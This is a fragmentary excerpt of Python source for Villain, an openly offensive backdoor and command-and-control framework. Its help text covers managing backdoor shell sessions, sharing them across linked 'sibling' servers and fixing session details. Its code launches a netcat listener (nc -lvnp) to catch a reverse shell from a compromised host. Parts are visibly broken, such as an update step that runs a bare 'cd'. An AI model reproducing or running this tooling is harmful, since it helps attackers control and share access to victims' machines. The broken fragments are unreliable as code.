...
def print_meta():
	print(f'{META} Created by t3l3machus & zape\n')
...
class PrompHelp:
	...
	commands = {
		...
		'connect' : {
			'details' : f''' 			
			\rConnect with another instance of (sibling server). Once connected, you will be able to see and interact with foreign shell sessions owned by sibling servers and vice-versa. Multiple sibling servers can be connected at once. The limit of connections depends on the number of active threads a Villain instance can have at once. Read the Usage Guide or check my YouTube channel for details.
		...
		'repair' : {
			'details' : f''' 			
			\rUse this command to manually correct a backdoor session's hostname/username value, in case does not interpret the information correctly when the session is established.
			\r 	
		...
		'threads' : {
			'details' : f'''
			\rCreates a lot of threads to be able to handle multiple backdoor sessions, connections with siblings and more. In file there is a BoundedSemaphore that works as a thread limiter to prevent resource contention, set by default to 100 (you can of course change it). This command lists the active threads, to give you an idea of what is happening in the background, what is the current value of the thread limiter etc.
			\r  
		...
		'sockets' : {
			'details' : f'''
			\rPrints related socket services info.
			''',
			'least_args' : 0,
			'max_args' : 0
		},
		...
		'cmdinspector' : {
			'details' : f'''
			\rHas a function that inspects user issued shell commands for input that may cause a backdoor shell session to hang (e.g., unclosed single/double quotes or backticks, commands that may start a new interactive session within the current shell and more). 
...
def main():
	...
	if args.update:
		...
		try:
			...
			u = check_output(f'cd', shell = True).decode('utf-8')

			if re.search('Updating', u):
				print(f'[{INFO}] Update completed! Please, restart.')
				updated = True
				...
				print(f'[{FAILED}] Something went wrong. Are you running from your local git repository?')
				print(f'[{DEBUG}] Consider running  inside the project\'s directory.')

		except:
			print(f'[{FAILED}] Inside the project\'s directory.')
					...
					if sessions_check[0]:
						...
						if session_owner_id == core.return_server_uniq_id():
							...
							if verified.lower().strip() in ['y', 'yes']:
								# Start listener
								os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | nc -lvnp {lport}"')
								zape_cmd['issuer'] = core.return_server_uniq_id()
								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, zape_cmd)
